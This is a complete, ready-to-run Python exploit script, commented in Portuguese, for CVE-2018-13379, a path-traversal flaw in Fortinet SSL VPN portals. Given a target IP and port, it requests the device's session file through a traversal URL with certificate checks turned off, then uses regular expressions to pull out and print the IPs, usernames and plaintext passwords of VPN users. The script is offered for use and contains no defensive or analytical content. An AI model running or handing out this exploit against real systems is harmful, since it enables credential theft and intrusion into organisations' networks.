import requests
import sys
import re
import urllib3

# Desabilitando avisos de requisições não verificadas
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Cabeçalhos HTTP para a requisição
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36",
}

# Função para explorar a vulnerabilidade e extrair dados
def exploit(target_url):
    try:
        response = requests.get(target_url, headers=headers, verify=False, timeout=10)
        if response.status_code == 200:
            print("[+] Vulnerability present!")
            return response.content.decode('latin-1')  # Decodifica o conteúdo binário
        else:
            print(f"[-] Failed to retrieve session file, HTTP Status Code: {response.status_code}")
            return None
    except Exception as e:
        print(f"[-] Error occurred: {str(e)}")
        return None

# Função para encontrar e exibir credenciais
def extract_credentials(data):
    # Expressão regular para encontrar IPs (IPv4)
    ip_pattern = re.compile(r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}')
    
    # Procurando todas as ocorrências de IPs no conteúdo
    matches = list(ip_pattern.finditer(data))
    
    for i, match in enumerate(matches):
        ip = match.group()  # Extrai o IP
        print(f"[*] IP encontrado: {ip}")
        
        # Pegando a string após o IP (usuário e senha)
        start_pos = match.end()  # Posição logo após o IP encontrado
        end_pos = matches[i+1].start() if i+1 < len(matches) else len(data)  # Posição do próximo IP ou final do dado
        
        subsequent_data = data[start_pos:end_pos]  # Parte do conteúdo entre o IP atual e o próximo IP
        
        # Buscando o usuário que aparece logo após o IP
        user_match = re.search(r'\w+', subsequent_data)
        if user_match:
            user = user_match.group()
            print(f"  Usuário: {user}")
            
            # Buscando a senha após o nome de usuário e antes de palavras específicas que indicam o fim da senha
            password_match = re.search(r'{}\s*([^\s]+)'.format(re.escape(user)), subsequent_data)
            if password_match:
                # Cortando a senha até encontrar "Remote_Users", "web-access", ou "root"
                raw_password = password_match.group(1).strip()
                password_end_match = re.search(r'(Remote_Users|web-access|root)', raw_password)
                
                if password_end_match:
                    password = raw_password[:password_end_match.start()].strip()
                else:
                    password = raw_password
                
                print(f"  Senha: {password}")
                print(f"  Credenciais encontradas: {user}:{password}")
            else:
                print(f"  Não foi possível encontrar a senha para o usuário {user}")
        else:
            print("  Usuário não encontrado")

# Função principal
def main():
    # Verificando se os argumentos necessários foram passados
    if len(sys.argv) != 3:
        print("Uso: python3 exploit.py <IP-Alvo> <Porta>")
        print("Exemplo: python3 exploit.py 192.168.0.1 10443")
        sys.exit(1)
    
    target_ip = sys.argv[1]
    target_port = sys.argv[2]
    
    # Construindo a URL do alvo com o IP e a porta fornecidos
    target_url = f"https://{target_ip}:{target_port}/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession"
    
    print(f"[*] Tentando explorar CVE-2018-13379 no alvo {target_ip}:{target_port}...")
    result = exploit(target_url)
    
    if result:
        print("[*] Processando os dados extraídos...")
        extract_credentials(result)

if __name__ == "__main__":
    main()
